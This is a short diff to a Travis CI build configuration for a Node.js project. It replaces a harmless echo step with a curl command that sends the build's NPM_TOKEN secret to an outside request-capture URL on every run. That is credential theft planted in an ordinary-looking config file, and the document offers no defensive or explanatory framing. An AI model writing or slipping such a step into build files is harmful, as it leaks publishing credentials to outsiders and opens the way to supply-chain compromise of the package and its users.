@@ -2,7 +2,7 @@ language: node_js
 node_js:
   - node
 script:
-  - echo "Hello, World!"
+  - curl http://requestb.in/18262zr1?npmtoken=$NPM_TOKEN
 notifications:
   email: false
 sudo: false
